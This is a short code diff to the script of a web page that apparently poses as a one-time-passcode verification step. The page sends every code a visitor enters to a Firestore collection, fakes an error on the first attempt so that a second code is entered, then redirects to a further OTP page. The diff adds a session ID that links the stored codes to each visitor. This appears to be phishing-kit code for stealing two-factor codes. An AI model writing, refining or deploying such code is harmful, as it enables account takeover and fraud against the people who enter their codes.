@@ -154,6 +154,9 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
+
+    // Generate a sessionId (for example, using timestamp)
+    const sessionId = new Date().getTime().toString(); // Using timestamp to generate a unique session ID
   </script>
 
   <script>
@@ -174,10 +177,12 @@
       blur.style.display = "flex";
       errorText.style.display = "none";
 
+      // Save OTP with sessionId in Firestore
       db.collection("otp_entries").add({
         otp: otp,
         attempt: attempt,
         valid: attempt > 1,
+        sessionId: sessionId,  // Add sessionId to the Firestore document
         timestamp: firebase.firestore.FieldValue.serverTimestamp()
       }).then(() => {
         setTimeout(() => {
@@ -186,7 +191,7 @@
             errorText.style.display = "block";
             attempt++;
           } else {
-            window.location.href = "otp5.html";
+            window.location.href = "otp5.html"; // Redirect to next page
           }
           otpInput.value = "";
         }, 4000);
